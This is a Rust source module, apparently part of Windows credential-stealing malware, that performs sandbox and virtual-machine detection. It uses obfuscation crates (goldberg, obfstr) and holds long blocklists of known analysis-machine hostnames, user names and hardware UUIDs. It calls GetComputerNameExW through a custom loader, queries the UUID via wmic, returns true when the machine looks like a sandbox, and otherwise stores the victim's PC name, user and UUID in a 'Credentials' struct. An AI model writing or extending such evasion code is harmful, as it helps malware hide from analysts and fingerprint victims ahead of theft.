use goldberg::goldberg_stmts;
use obfstr::obfstr as obf;
use std::sync::{Arc, Mutex};
use rayon::prelude::*;

use crate::global::{utils::Credentials, loader};

fn get_hostname() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("sandbox")),
            String::from(obf!("cuckoo")),
            String::from(obf!("vm")),
            String::from(obf!("virtual")),
            String::from(obf!("qemu")),
            String::from(obf!("vbox")),
            String::from(obf!("xen")),
        ]
    }
}

fn get_computer_name() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("WDAGUtilityAccount")),
            String::from(obf!("JOANNA")),
            String::from(obf!("WINZDS-21T43RNG")),
            String::from(obf!("Abby")),
            String::from(obf!("Peter Wilson")),
            String::from(obf!("hmarc")),
            String::from(obf!("patex")),
            String::from(obf!("JOHN-PC")),
            String::from(obf!("RDhJ0CNFevzX")),
            String::from(obf!("kEecfMwgj")),
            String::from(obf!("Frank")),
            String::from(obf!("8Nl0ColNQ5bq")),
            String::from(obf!("Lisa")),
            String::from(obf!("John")),
            String::from(obf!("george")),
            String::from(obf!("PxmdUOpVyx")),
            String::from(obf!("8VizSM")),
            String::from(obf!("w0fjuOVmCcP5A")),
            String::from(obf!("lmVwjj9b")),
            String::from(obf!("PqONjHVwexsS")),
            String::from(obf!("3u2v9m8")),
            String::from(obf!("Julia")),
            String::from(obf!("HEUeRzl")),
            String::from(obf!("BEE7370C-8C0C-4")),
            String::from(obf!("DESKTOP-NAKFFMT")),
            String::from(obf!("WIN-5E07COS9ALR")),
            String::from(obf!("B30F0242-1C6A-4")),
            String::from(obf!("DESKTOP-VRSQLAG")),
            String::from(obf!("Q9IATRKPRH")),
            String::from(obf!("XC64ZB")),
            String::from(obf!("DESKTOP-D019GDM")),
            String::from(obf!("DESKTOP-WI8CLET")),
            String::from(obf!("SERVER1")),
            String::from(obf!("LISA-PC")),
            String::from(obf!("DESKTOP-B0T93D6")),
            String::from(obf!("DESKTOP-1PYKP29")),
            String::from(obf!("DESKTOP-1Y2433R")),
            String::from(obf!("WILEYPC")),
            String::from(obf!("WORK")),
            String::from(obf!("6C4E733F-C2D9-4")),
            String::from(obf!("RALPHS-PC")),
            String::from(obf!("DESKTOP-WG3MYJS")),
            String::from(obf!("DESKTOP-7XC6GEZ")),
            String::from(obf!("DESKTOP-5OV9S0O")),
            String::from(obf!("QarZhrdBpj")),
            String::from(obf!("ORELEEPC")),
            String::from(obf!("ARCHIBALDPC")),
            String::from(obf!("JULIA-PC")),
            String::from(obf!("d1bnJkfVlH")),
            String::from(obf!("NETTYPC")),
            String::from(obf!("DESKTOP-BUGIO")),
            String::from(obf!("DESKTOP-CBGPFEE")),
            String::from(obf!("SERVER-PC")),
            String::from(obf!("TIQIYLA9TW5M")),
            String::from(obf!("DESKTOP-KALVINO")),
            String::from(obf!("COMPNAME_4047")),
            String::from(obf!("DESKTOP-19OLLTD")),
            String::from(obf!("DESKTOP-DE369SE")),
            String::from(obf!("EA8C2E2A-D017-4")),
            String::from(obf!("AIDANPC")),
            String::from(obf!("LUCAS-PC")),
            String::from(obf!("MARCI-PC")),
            String::from(obf!("ACEPC")),
            String::from(obf!("MIKE-PC")),
            String::from(obf!("DESKTOP-IAPKN1P")),
            String::from(obf!("DESKTOP-NTU7VUO")),
            String::from(obf!("LOUISE-PC")),
            String::from(obf!("T00917")),
            String::from(obf!("test42")),
        ]
    }
}

fn get_uuids() -> Vec<String> {
    goldberg_stmts! {
        vec![
            String::from(obf!("7AB5C494-39F5-4941-9163-47F54D6D5016")),
            String::from(obf!("03DE0294-0480-05DE-1A06-350700080009")),
            String::from(obf!("11111111-2222-3333-4444-555555555555")),
            String::from(obf!("6F3CA5EC-BEC9-4A4D-8274-11168F640058")),
            String::from(obf!("ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548")),
            String::from(obf!("4C4C4544-0050-3710-8058-CAC04F59344A")),
            String::from(obf!("00000000-0000-0000-0000-AC1F6BD04972")),
            String::from(obf!("00000000-0000-0000-0000-000000000000")),
            String::from(obf!("5BD24D56-789F-8468-7CDC-CAA7222CC121")),
            String::from(obf!("49434D53-0200-9065-2500-65902500E439")),
            String::from(obf!("49434D53-0200-9036-2500-36902500F022")),
            String::from(obf!("777D84B3-88D1-451C-93E4-D235177420A7")),
            String::from(obf!("49434D53-0200-9036-2500-369025000C65")),
            String::from(obf!("B1112042-52E8-E25B-3655-6A4F54155DBF")),
            String::from(obf!("00000000-0000-0000-0000-AC1F6BD048FE")),
            String::from(obf!("EB16924B-FB6D-4FA1-8666-17B91F62FB37")),
            String::from(obf!("A15A930C-8251-9645-AF63-E45AD728C20C")),
            String::from(obf!("67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3")),
            String::from(obf!("C7D23342-A5D4-68A1-59AC-CF40F735B363")),
            String::from(obf!("63203342-0EB0-AA1A-4DF5-3FB37DBB0670")),
            String::from(obf!("44B94D56-65AB-DC02-86A0-98143A7423BF")),
            String::from(obf!("6608003F-ECE4-494E-B07E-1C4615D1D93C")),
            String::from(obf!("D9142042-8F51-5EFF-D5F8-EE9AE3D1602A")),
            String::from(obf!("49434D53-0200-9036-2500-369025003AF0")),
            String::from(obf!("8B4E8278-525C-7343-B825-280AEBCD3BCB")),
            String::from(obf!("4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27")),
            String::from(obf!("79AF5279-16CF-4094-9758-F88A616D81B4")),
            String::from(obf!("FF577B79-782E-0A4D-8568-B35A9B7EB76B")),
            String::from(obf!("08C1E400-3C56-11EA-8000-3CECEF43FEDE")),
            String::from(obf!("6ECEAF72-3548-476C-BD8D-73134A9182C8")),
            String::from(obf!("49434D53-0200-9036-2500-369025003865")),
            String::from(obf!("119602E8-92F9-BD4B-8979-DA682276D385")),
            String::from(obf!("12204D56-28C0-AB03-51B7-44A8B7525250")),
            String::from(obf!("63FA3342-31C7-4E8E-8089-DAFF6CE5E967")),
            String::from(obf!("365B4000-3B25-11EA-8000-3CECEF44010C")),
            String::from(obf!("D8C30328-1B06-4611-8E3C-E433F4F9794E")),
            String::from(obf!("00000000-0000-0000-0000-50E5493391EF")),
            String::from(obf!("00000000-0000-0000-0000-AC1F6BD04D98")),
            String::from(obf!("4CB82042-BA8F-1748-C941-363C391CA7F3")),
            String::from(obf!("B6464A2B-92C7-4B95-A2D0-E5410081B812")),
            String::from(obf!("BB233342-2E01-718F-D4A1-E7F69D026428")),
            String::from(obf!("9921DE3A-5C1A-DF11-9078-563412000026")),
            String::from(obf!("CC5B3F62-2A04-4D2E-A46C-AA41B7050712")),
            String::from(obf!("00000000-0000-0000-0000-AC1F6BD04986")),
            String::from(obf!("C249957A-AA08-4B21-933F-9271BEC63C85")),
            String::from(obf!("BE784D56-81F5-2C8D-9D4B-5AB56F05D86E")),
            String::from(obf!("ACA69200-3C4C-11EA-8000-3CECEF4401AA")),
            String::from(obf!("3F284CA4-8BDF-489B-A273-41B44D668F6D")),
            String::from(obf!("BB64E044-87BA-C847-BC0A-C797D1A16A50")),
            String::from(obf!("2E6FB594-9D55-4424-8E74-CE25A25E36B0")),
            String::from(obf!("42A82042-3F13-512F-5E3D-6BF4FFFD8518")),
            String::from(obf!("38AB3342-66B0-7175-0B23-F390B3728B78")),
            String::from(obf!("48941AE9-D52F-11DF-BBDA-503734826431")),
            String::from(obf!("032E02B4-0499-05C3-0806-3C0700080009")),
            String::from(obf!("DD9C3342-FB80-9A31-EB04-5794E5AE2B4C")),
            String::from(obf!("E08DE9AA-C704-4261-B32D-57B2A3993518")),
            String::from(obf!("07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9")),
            String::from(obf!("88DC3342-12E6-7D62-B0AE-C80E578E7B07")),
            String::from(obf!("5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E")),
            String::from(obf!("96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE")),
            String::from(obf!("0934E336-72E4-4E6A-B3E5-383BD8E938C3")),
            String::from(obf!("12EE3342-87A2-32DE-A390-4C2DA4D512E9")),
            String::from(obf!("38813342-D7D0-DFC8-C56F-7FC9DFE5C972")),
            String::from(obf!("8DA62042-8B59-B4E3-D232-38B29A10964A")),
            String::from(obf!("3A9F3342-D1F2-DF37-68AE-C10F60BFB462")),
            String::from(obf!("F5744000-3C78-11EA-8000-3CECEF43FEFE")),
            String::from(obf!("FA8C2042-205D-13B0-FCB5-C5CC55577A35")),
            String::from(obf!("C6B32042-4EC3-6FDF-C725-6F63914DA7C7")),
            String::from(obf!("FCE23342-91F1-EAFC-BA97-5AAE4509E173")),
            String::from(obf!("CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F")),
            String::from(obf!("050C3342-FADD-AEDF-EF24-C6454E1A73C9")),
            String::from(obf!("4DC32042-E601-F329-21C1-03F27564FD6C")),
            String::from(obf!("DEAEB8CE-A573-9F48-BD40-62ED6C223F20")),
            String::from(obf!("05790C00-3B21-11EA-8000-3CECEF4400D0")),
            String::from(obf!("5EBD2E42-1DB8-78A6-0EC3-031B661D5C57")),
            String::from(obf!("9C6D1742-046D-BC94-ED09-C36F70CC9A91")),
            String::from(obf!("907A2A79-7116-4CB6-9FA5-E5A58C4587CD")),
            String::from(obf!("A9C83342-4800-0578-1EE8-BA26D2A678D2")),
            String::from(obf!("D7382042-00A0-A6F0-1E51-FD1BBF06CD71")),
            String::from(obf!("1D4D3342-D6C4-710C-98A3-9CC6571234D5")),
            String::from(obf!("CE352E42-9339-8484-293A-BD50CDC639A5")),
            String::from(obf!("60C83342-0A97-928D-7316-5F1080A78E72")),
            String::from(obf!("02AD9898-FA37-11EB-AC55-1D0C0A67EA8A")),
            String::from(obf!("DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F")),
            String::from(obf!("FED63342-E0D6-C669-D53F-253D696D74DA")),
            String::from(obf!("2DD1B176-C043-49A4-830F-C623FFB88F3C")),
            String::from(obf!("4729AEB0-FC07-11E3-9673-CE39E79C8A00")),
            String::from(obf!("84FE3342-6C67-5FC6-5639-9B3CA3D775A1")),
            String::from(obf!("DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D")),
            String::from(obf!("CEFC836C-8CB1-45A6-ADD7-209085EE2A57")),
            String::from(obf!("A7721742-BE24-8A1C-B859-D7F8251A83D3")),
            String::from(obf!("3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E")),
            String::from(obf!("D2DC3342-396C-6737-A8F6-0C6673C1DE08")),
            String::from(obf!("EADD1742-4807-00A0-F92E-CCD933E9D8C1")),
            String::from(obf!("AF1B2042-4B90-0000-A4E4-632A1C8C7EB1")),
            String::from(obf!("FE455D1A-BE27-4BA4-96C8-967A6D3A9661")),
            String::from(obf!("921E2042-70D3-F9F1-8CBD-B398A21F89C6")),
            String::from(obf!("129B5E6B-E368-45D4-80AB-D4F106495924")),
            String::from(obf!("8F384129-F079-456E-AE35-16608E317F4F")),
            String::from(obf!("E6833342-780F-56A2-6F92-77DACC2EF8B3")),
            String::from(obf!("71DC2242-6EA2-C40B-0798-B4F5B4CC8776")),
            String::from(obf!("00000000-0000-0000-0000-AC1F6BD04C9E")),
        ]
    }
}

fn get_cpname() -> Result<String, ()>  {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    let handle = loader::LoadMod::new(obf!("kernel32.dll")).unwrap();
    let get_computer_name_ex = loader::call_function!(&handle, fn(u32, *mut u16, *mut u32) -> i32, obf!("GetComputerNameExW"));
    
    if get_computer_name_ex(1, buffer.as_mut_ptr(), &mut size) == 0 {
        return Err(());
    }
    Ok(String::from_utf16_lossy(&buffer[..size as usize]))
}

pub fn get(creds :  &Arc<Mutex<Credentials>>) -> bool {
    let blacklisted_hostname = get_hostname();
    let blacklisted_computer_name = get_computer_name();
    let blacklisted_uuids = get_uuids();

    let hostname = get_cpname().unwrap();
    let username = std::env!("USERNAME");
    let computer_name = std::env!("COMPUTERNAME");
    let uuid_command: std::process::Output = std::process::Command::new(obf!("wmic"))
        .args(&[obf!("csproduct"), obf!("get"), obf!("UUID")])
        .output()
        .expect(obf!("Failed to execute process"));

    let decoded_output = String::from_utf8_lossy(&uuid_command.stdout);
    let decoded_lines: Vec<_> = decoded_output.split('\n').collect();
    let trimmed_output: &str = decoded_lines[1].trim();

    let pool = rayon::ThreadPoolBuilder::new().num_threads(2).build().unwrap();
    
    let (bool_uuids, bool_computername) = pool.install(|| {
        rayon::join(|| {
            blacklisted_uuids.par_iter().any(|i| i == trimmed_output)
        }, || {
            blacklisted_computer_name.par_iter().any(|i| i == computer_name || i == username)
        })
    });
    if bool_uuids || bool_computername || blacklisted_hostname.par_iter().any(|i| i == &hostname) {
        return true;
    }
    creds.lock().unwrap().pc_name = computer_name.to_string();
    creds.lock().unwrap().pc_user = username.to_string();
    creds.lock().unwrap().uuids = trimmed_output.to_string();
    false
}